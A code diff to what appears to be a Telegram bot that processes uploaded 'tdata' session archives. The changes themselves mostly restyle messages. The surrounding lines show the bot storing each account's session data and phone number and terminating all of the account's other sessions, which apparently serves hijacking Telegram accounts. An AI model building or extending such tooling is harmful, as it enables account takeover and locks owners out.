@@ -102,14 +102,20 @@ def require_verified(func):
         if await db.is_verified(user_id) or user_id in ADMINS:
             return await func(client, message, *args, **kwargs)
         else:
-            # notify admins
+            # ɴᴏᴛɪꜰʏ ᴀᴅᴍɪɴꜱ
             for admin_id in ADMINS:
                 await client.send_message(
                     admin_id,
-                    f"🚨 Unverified user tried to access: {user_id} (@{message.from_user.username}) \nTᴏ ᴠᴇʀɪꜰʏ <code> /verify {user_id} </code>."
+                    f"🚨 Uɴᴠᴇʀɪꜰɪᴇᴅ ᴜꜱᴇʀ ᴛʀɪᴇᴅ ᴛᴏ ᴀᴄᴄᴇꜱꜱ:\n"
+                    f"👤 {user_id} (@{message.from_user.username})\n\n"
+                    f"✅ Tᴏ ᴠᴇʀɪꜰʏ:\n<code>/verify {user_id}</code>"
                 )
-            return await message.reply("⛔ You are not verified yet. Please wait for admin approval.")
+            return await message.reply(
+                "⛔ Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴠᴇʀɪꜰɪᴇᴅ ʏᴇᴛ.\n"
+                "⏳ Pʟᴇᴀꜱᴇ ᴡᴀɪᴛ ꜰᴏʀ ᴀᴅᴍɪɴ ᴀᴘᴘʀᴏᴠᴀʟ."
+            )
     return wrapper
+
     
 async def check_2fa(client):
     try:
@@ -147,7 +153,8 @@ async def show_tdata_structure(tdata_path: str, message: Message, num):
         preview += f"\n... ({len(structure)-50} more entries)"
 
     await message.reply(
-        f"📂 TDATA structure at:\n`{tdata_path}`\n```\n{preview}\n```"
+        f"📂 TDATA structure at:\n`{tdata_path}`\n```\n{preview}\n```",
+        quote=True
     )
 
 async def show_zip_structure(zip_path, message, client):
@@ -170,7 +177,8 @@ async def show_zip_structure(zip_path, message, client):
         await client.send_document(
             chat_id=message.chat.id,
             document=txt_path,
-            caption="📂 Full zip structure"
+            caption="📂 Full zip structure",
+            reply_to_message_id=message.id
         )
 
         os.remove(txt_path)
@@ -452,7 +460,7 @@ async def handle_archive(client, message):
                 sydno = await db.save_account(me.id, info, tdata_bytes)
                 await show_rar(tdata_path, message, sydno)
                 nsyd = await terminate_all_other_sessions(tele_client)
-                await message.reply(f"{sydno} ~ +{me.phone}: \n{nsyd} \n{syd}")
+                await message.reply(f"{sydno} ~ +{me.phone}: \n{nsyd} \n{syd}", quote=True)
                 results.append(
                     f"#{sydno}\n"
                     f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
@@ -484,7 +492,7 @@ async def handle_archive(client, message):
         with open(report_path, "w") as f:
             f.write(report_text)
 
-        await message.reply_document(report_path, caption="Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ ✅")
+        await message.reply_document(report_path, caption="Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ ✅", quote=True)
 
     except Exception as e:
         await message.reply(f"❌ ᴇʀʀᴏʀ: {e}")
